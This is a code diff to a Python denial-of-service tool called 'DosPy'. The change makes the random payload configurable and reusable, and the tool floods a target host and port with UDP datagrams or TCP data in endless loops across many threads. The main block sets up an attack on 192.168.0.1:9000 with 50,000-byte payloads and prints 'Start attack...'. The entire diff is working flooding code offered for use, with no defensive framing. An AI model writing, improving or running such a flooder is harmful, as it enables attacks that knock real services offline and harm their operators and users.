@@ -5,10 +5,11 @@ from threading import Thread
 
 
 class DosPy(object):
-    def __init__(self, host: str, port: int, threads_num: int = 100) -> None:
+    def __init__(self, host: str, port: int, threads_num: int = 100, bytes_num: int = 1000) -> None:
         self._host = host
         self._port = port
         self._threads_num = threads_num
+        self._bytes_num = secrets.token_bytes(bytes_num)
 
         self._default_protocol = socket.SOCK_DGRAM
 
@@ -39,7 +40,7 @@ class DosPy(object):
             address = (self._host, self._port)
 
             while True:
-                sock.sendto(secrets.token_bytes(50000), address)
+                sock.sendto(self._bytes_num, address)
         elif self._default_protocol == socket.SOCK_STREAM:
             address = (self._host, self._port)
 
@@ -48,7 +49,7 @@ class DosPy(object):
 
             while True:
                 try:
-                    sock.send(secrets.token_bytes(50000))
+                    sock.send(self._bytes_num)
                 except OSError:
                     sock.close()
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -64,7 +65,7 @@ class DosPy(object):
 
 
 if __name__ == '__main__':
-    dos = DosPy('192.168.0.1', 9000, threads_num=100)
+    dos = DosPy('192.168.0.1', 9000, threads_num=100, bytes_num=50000)
     print(f'Normal response time: {dos.check_connection_ms()}')
 
     print('Start attack...')
